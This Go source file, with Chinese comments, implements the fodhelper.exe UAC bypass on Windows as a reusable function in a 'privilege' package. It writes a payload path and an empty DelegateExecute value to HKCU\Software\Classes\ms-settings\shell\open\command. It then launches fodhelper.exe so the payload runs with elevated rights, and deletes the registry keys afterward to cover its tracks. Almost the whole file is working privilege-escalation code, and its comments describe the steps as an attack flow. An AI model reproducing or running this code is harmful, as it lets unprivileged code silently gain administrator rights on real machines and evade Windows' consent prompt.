//go:build windows
// +build windows

package privilege

import (
	"fmt"
	"os/exec"
	"time"
)

/*
fodhelper.exe UAC Bypass

原理：
1. fodhelper.exe 是 Windows 10+ 自带的程序，在 UAC 白名单中
2. 它在启动时会读取注册表 HKCU\Software\Classes\ms-settings\shell\open\command
3. 如果该注册表项存在，它会以提升的权限执行该命令
4. 由于是用户注册表 (HKCU)，普通用户权限即可写入

攻击流程：
1. 写入恶意注册表项
2. 启动 fodhelper.exe
3. fodhelper.exe 读取注册表并以高权限执行我们的程序
4. 清理注册表项
*/

const (
	// 注册表路径
	fodhelperRegPath = `HKCU\Software\Classes\ms-settings\shell\open\command`
)

// ElevateViaFodhelper 通过 fodhelper.exe 进行 UAC Bypass
// payload: 要以提升权限执行的程序路径
func ElevateViaFodhelper(payload string) error {
	// 检查 fodhelper.exe 是否存在
	if !CheckFodhelperAvailable() {
		return fmt.Errorf("fodhelper.exe not found (may not be available on this Windows version)")
	}

	// 1. 创建注册表项并设置默认值为 payload
	args := []string{
		"add", fodhelperRegPath,
		"/ve", "/t", "REG_SZ",
		"/d", payload,
		"/f",
	}

	cmd := exec.Command("reg", args...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("failed to create registry key: %v (output: %s)", err, string(output))
	}

	// 2. 设置 DelegateExecute 为空字符串（必需）
	args2 := []string{
		"add", fodhelperRegPath,
		"/v", "DelegateExecute",
		"/t", "REG_SZ",
		"/d", "",
		"/f",
	}

	cmd = exec.Command("reg", args2...)
	output, err = cmd.CombinedOutput()
	if err != nil {
		cleanupFodhelper()
		return fmt.Errorf("failed to set DelegateExecute: %v (output: %s)", err, string(output))
	}

	// 3. 启动 fodhelper.exe（使用 cmd /c start 分离进程）
	cmd = exec.Command("cmd", "/c", "start", "fodhelper.exe")
	if err := cmd.Start(); err != nil {
		cleanupFodhelper()
		return fmt.Errorf("failed to start fodhelper: %v", err)
	}

	// 4. 异步等待并清理
	go func() {
		// 等待一段时间确保新进程启动
		time.Sleep(2 * time.Second)
		cleanupFodhelper()
	}()

	return nil
}

// cleanupFodhelper 清理注册表项
func cleanupFodhelper() {
	// 逐层删除注册表项
	exec.Command("reg", "delete", fodhelperRegPath, "/f").Run()
	exec.Command("reg", "delete", `HKCU\Software\Classes\ms-settings\shell\open`, "/f").Run()
	exec.Command("reg", "delete", `HKCU\Software\Classes\ms-settings\shell`, "/f").Run()
	exec.Command("reg", "delete", `HKCU\Software\Classes\ms-settings`, "/f").Run()
}

// CheckFodhelperAvailable 检查 fodhelper 方法是否可用
func CheckFodhelperAvailable() bool {
	// fodhelper.exe 在 Windows 10 及以上版本可用
	// 检查文件是否存在
	cmd := exec.Command("where", "fodhelper.exe")
	return cmd.Run() == nil
}
